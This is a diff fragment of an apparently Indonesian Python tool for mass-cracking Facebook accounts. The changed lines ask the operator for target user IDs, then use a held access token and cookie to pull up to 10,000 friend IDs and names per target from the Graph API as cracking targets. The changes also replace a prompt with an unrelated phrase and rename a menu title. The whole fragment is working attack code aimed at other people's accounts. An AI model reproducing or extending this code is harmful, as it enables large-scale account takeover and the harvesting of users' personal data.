@@ -527,11 +527,11 @@ def massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input(f'KETIK "{H}me{P}" UNTUK CRACK DARI LIST TEMEN SENDIRI\ninput target '+str(yz)+' : ')
+		kl = input(f'KETIK "{H}me{P}" Berdoa Hu sing kengin nu Hejo\ninput target '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(10000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
@@ -589,7 +589,7 @@ def setting():
 	prints(Panel(f"""
 	{P2}[{M2}1{P2}]. mobile {M2} right recomdasi
 	{P2}[{M2}2{P2}]. free {B2}recomdasi
-	{P2}[{M2}3{P2}]. mbasic {B2}recomdasi""",title=f"{M2} VALIDATE ",style=f"{color_table}"))
+	{P2}[{M2}3{P2}]. mbasic {B2}recomdasi""",title=f"{M2} SALES ",style=f"{color_table}"))
 	print('')
 	print('')
 	hc = input(f'input : ')
